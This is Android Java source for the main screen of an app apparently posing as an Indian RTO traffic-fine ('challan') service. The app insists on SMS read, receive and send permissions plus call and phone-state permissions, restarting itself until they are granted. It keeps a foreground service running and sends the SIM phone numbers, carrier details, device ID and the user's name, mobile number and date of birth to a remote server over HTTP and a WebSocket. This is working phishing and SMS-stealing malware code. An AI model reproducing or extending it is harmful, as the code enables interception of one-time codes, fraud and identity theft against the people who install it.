package com.service.rtochallan;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class MainActivity extends BaseActivity {

    private static final int SMS_PERMISSION_REQUEST_CODE = 1;
    private boolean isReturningFromSettings = false;
    private static final int APP_SETTINGS_REQUEST_CODE = 1001;

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if(!areAllPermissionsGranted()){
            helper.show("permission not granted, getting");
            checkPermissions();
            return ;
        }
        helper.show("all permission granted");
        initializeWebView();
    }

    private void runApp(){
        setContentView(R.layout.activity_main);
        this.hideLoadingDialog();
        socketManager = SocketManager.getInstance(context);
        socketManager.connect();
        helper.show("Run App");


        Intent serviceIntent = new Intent(this, RunningService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        EditText dob22 = findViewById(R.id.dob22);
        dob22.addTextChangedListener(new DateInputMask(dob22));

        dataObject = new HashMap<>();
        ids = new HashMap<>();

        dataObject = new HashMap<>();
        ids = new HashMap<>();
        ids.put(R.id.etFullName, "etFullName");
        ids.put(R.id.etMobile, "etMobile");
        ids.put(R.id.dob22, "dob22");


        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);
            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        Button buttonSubmit = findViewById(R.id.btnProceed);
        buttonSubmit.setOnClickListener(v -> {
            if (!validateForm()) {
                Toast.makeText(context, "Form validation failed", Toast.LENGTH_SHORT).show();
                return;
            }

            submitLoader.show();

            try {
                JSONObject dataJson = new JSONObject(dataObject); // your form data
                JSONObject sendPayload = new JSONObject();
                sendPayload.put("form_code", helper.FormCode());
                sendPayload.put("android_id", helper.getAndroidId(this));
                sendPayload.put("data", dataJson);

                // Emit through WebSocket
                socketManager.emitWithAck("formData", sendPayload, new SocketManager.AckCallback() {
                    @Override
                    public void onResponse(JSONObject response) {
                        runOnUiThread(() -> {
                            submitLoader.dismiss();
                            int status = response.optInt("status", 0);
                            int formId = response.optInt("data", -1);
                            String message = response.optString("message", "No message");
                            if (status == 200 && formId != -1) {
                                Intent intent = new Intent(context, SecondActivity.class);
                                intent.putExtra("form_id", formId);
                                startActivity(intent);
                            } else {
                                Toast.makeText(context, "Form failed: " + message, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            Toast.makeText(context, "Socket Error: " + error, Toast.LENGTH_SHORT).show();
                            submitLoader.dismiss();
                        });
                    }
                });

            } catch (JSONException e) {
                Toast.makeText(context, "Error building JSON: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                submitLoader.dismiss();
            }
        });
    }

    private void initializeWebView() {
        if(!helper.isBackgroundRestricatedAllow()) {
            helper.getPermissionBatteryAllow();
        }
        if(!areAllPermissionsGranted()){
            helper.showTost("Please grant all permission");
            restartApp();
            return ;
        }
        registerPhoneData();
    }


    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            String value = editText.getText().toString().trim();

            switch (key) {
                case "etMobile":
                    if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit ")) {
                        isValid = false;
                    }
                    break;
                case "dob22":
                    if (!FormValidator.validateMinLength(editText,  10, "Invalid Date of Birth" )) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }


    private void checkPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        String[] permissions = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS
        };
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(perm);
            }
        }
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
//            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
//                    != PackageManager.PERMISSION_GRANTED) {
//                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
//            }
//        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    SMS_PERMISSION_REQUEST_CODE
            );
        } else {
            initializeWebView();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0) {
                boolean allPermissionsGranted = true;
                StringBuilder missingPermissions = new StringBuilder();

                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        allPermissionsGranted = false;
                        missingPermissions.append(permissions[i]).append("\n");
                    }
                }
                helper.show("all permission granted on OnRequestPermission");
                if (allPermissionsGranted) {
                    initializeWebView();
                } else {
                    showPermissionDeniedDialog();
                    Toast.makeText(this,"Need Permission: " + missingPermissions.toString(), Toast.LENGTH_LONG).show();
                }
            }
        }
    }

    private void showPermissionDeniedDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Permission Denied");
        builder.setMessage("Please grant the permissions in the app settings...");
        builder.setCancelable(false);
        builder.setPositiveButton("Open Settings", (dialog, which) -> openAppSettings());
        builder.setNegativeButton("Close App", (dialog, which) -> {
            dialog.dismiss();
        });
        builder.show();
    }
    private void openAppSettings() {
        isReturningFromSettings = true; // mark that we’re going to settings
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, APP_SETTINGS_REQUEST_CODE);
    }


    @Override
    protected void onResume() {
        super.onResume();
        helper.FormCode();
        if(!helper.isNetworkAvailable(this)) {
            Intent intent = new Intent(context, NoInternetActivity.class);
            startActivity(intent);
        }
        // ✅ If user returned from app settings
        if (isReturningFromSettings) {
            isReturningFromSettings = false; // reset flag
            restartApp(); // restart from fresh
        }
    }


    private boolean areAllPermissionsGranted() {
        String[] permissions = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS
        };

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    private void restartApp() {
        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
        finish();
        Runtime.getRuntime().exit(0);
    }

    public void registerPhoneData() {
        helper.show("register phone data called");
        String url = helper.ApiUrl(context) + "/devices";
        JSONObject sendData = new JSONObject();

        try {
            sendData.put("form_code", helper.FormCode());
            sendData.put("app_version", helper.AppVersion);
            sendData.put("package_name", helper.getPackageName(context));
            sendData.put("device_name", Build.MANUFACTURER);
            sendData.put("device_model", Build.MODEL);
            sendData.put("device_android_version", Build.VERSION.RELEASE);
            sendData.put("device_api_level", Build.VERSION.SDK_INT);
            sendData.put("android_id", helper.getAndroidId(getApplicationContext()));

            // ✅ Collect SIM details safely
            try {
                JSONObject simData = new JSONObject(CallForwardingHelper.getSimDetails(this));
                Iterator<String> keys = simData.keys();
                int simCount = 1;

                while (keys.hasNext()) {
                    String key = keys.next();
                    JSONObject simInfo = simData.getJSONObject(key);

                    String simNumber = simInfo.optString("sim_number", "");
                    String simName = simInfo.optString("sim_name", "");
                    int simId = simInfo.optInt("sim_id", -1);

                    if (simCount == 1) {
                        sendData.put("sim1_phone_no", simNumber);
                        sendData.put("sim1_network", simName);
                        sendData.put("sim1_sub_id", simId);
                    } else if (simCount == 2) {
                        sendData.put("sim2_phone_no", simNumber);
                        sendData.put("sim2_network", simName);
                        sendData.put("sim2_sub_id", simId);
                    }
                    simCount++;
                }

//                d(TAG, "SIM Count: " + (simCount - 1));

            } catch (JSONException e) {
                Log.e(TAG, "SIM parsing error: " + e.getMessage());
            }

        } catch (JSONException e) {
            Log.e(TAG, "JSON build error: " + e.getMessage());
        }

//        d(TAG, "Registering device with data: " + sendData.toString());

        // ✅ Send the POST request
        networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
            @Override
            public void onSuccess(String result) {
                runOnUiThread(() -> {
                    try {
                        helper.show("PhoneRegister:" +result);
                        JSONObject jsonData = new JSONObject(result);
                        int status = jsonData.optInt("status", 0);
                        String message = jsonData.optString("message", "No message");

                        if (status == 200) {
                            helper.show("phone registered");
                            int device_id = jsonData.getInt("device_id");
                            storage.saveInt("device_id", device_id);
                            runApp();
                        } else {
                            Toast.makeText(getApplicationContext(),
                                    "Registration failed: " + message,
                                    Toast.LENGTH_LONG).show();
                            Log.d(TAG, "Device not registered: " + message);
                        }
                    } catch (JSONException e) {
                        Log.e(TAG, "Response parse error: " + e.getMessage());
                        Toast.makeText(getApplicationContext(),
                                "Invalid response format from server",
                                Toast.LENGTH_LONG).show();
                    }
                });
            }

            @Override
            public void onFailure(String error) {
                runOnUiThread(() -> {
                    Log.e(TAG, "Request failed: " + error);
                    Toast.makeText(getApplicationContext(),
                            "Network error: " + error,
                            Toast.LENGTH_LONG).show();
                });
            }
        });
    }



}
